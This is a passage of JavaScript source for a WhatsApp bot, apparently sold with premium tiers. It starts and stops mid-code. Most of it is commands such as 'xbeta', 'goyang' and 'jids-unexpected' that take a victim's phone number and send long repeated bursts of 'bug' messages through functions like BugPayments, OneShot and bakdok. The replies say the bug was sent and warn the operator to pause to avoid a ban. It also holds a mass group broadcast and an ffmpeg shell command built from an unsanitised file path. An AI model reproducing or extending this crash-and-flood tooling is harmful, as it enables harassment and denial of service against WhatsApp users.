await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
            }
            reply(`*Done Ga Bang?*`)
            break
case 'xpayment':
case 'xbeta': {
                if (!isPremium) return reply(mess.only.premium)
                if (!q) return reply(`Example : ${prefix + command} 62838×××××`)
                let number = q.replace(/[^0-9]/g, '');
                if (number.startsWith('0')) return reply(`Example : ${prefix + command} 62xxxxxxxxxx`)
                let target = number + '@s.whatsapp.net';
                await reply("In process..")
                await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
                reply(`Successfully sent Bug`)
            }
                break
case 'tauran_anj': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case "boton":{
//if (!isRegistered) return registerbut(noregis)
if (!isPremium) return reply(mess.only.premium)
if (!isOwner) return reply(mess.only.owner)
let ntahlahh9 = `./lib/IMLEK.mp3`
let getGroups = await BaraCybeer.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let data = groupss.map((v) => v.id)

let teks22 = `*[!] ANNOUNCEMENT*📢\n\n_BOT telah online, sekarang anda bisa menjadi bot clone dengan cara, *ketik .jadibot* dan *ketik .menu* untuk melihat daftar list yang disediakan oleh BOT_`
const buf = await getBuffer(`https://img.moehu.org/pic.php?id=mrfz`)
for (let x of data) {
await BaraCybeer.sendMessage(x, {audio: fs.readFileSync(ntahlahh9), mimetype:'audio/mpeg', ptt: true }, m)
await BaraCybeer.sendMessage(x, { contextInfo: { forwardingScore: 10, isForwarded: false }, image: buf, caption: teks22 })
await sleep(100)
}
reply(`Success send broadcast message to ${data.length} groups chats`)
}
break
case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('./lib/uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? BaraCybeer.user.jid : m.sender;
//const name = await BaraCybeer.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await BaraCybeer.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  BaraCybeer.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break
case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break
case 'goyang': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 62xxxxxxxxxx`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62xxxxxxxxxx`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await reply('Sucessfull sent bug') 
}
break
case "jids-unexpected": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await BaraCybeer.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62xxxxxxxxxx") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'aing_berduka': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wkwkk😂_`)
}
}
break
case 'sayang': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wkwkk😂_`)
}
}
break
case 'halo': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
reply(`_Yakin Ga C1 Wkwkk😂_`)
}
}
break
case 'tes': {
if (!isOwner) return reply(mess.only.owner)
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
reactemoji('☠️')
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await BugPayments(target, force2)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
await BugPayments(target, force)
await OneShot(target, force)
await sendPaymentInfoMessage(target, force)
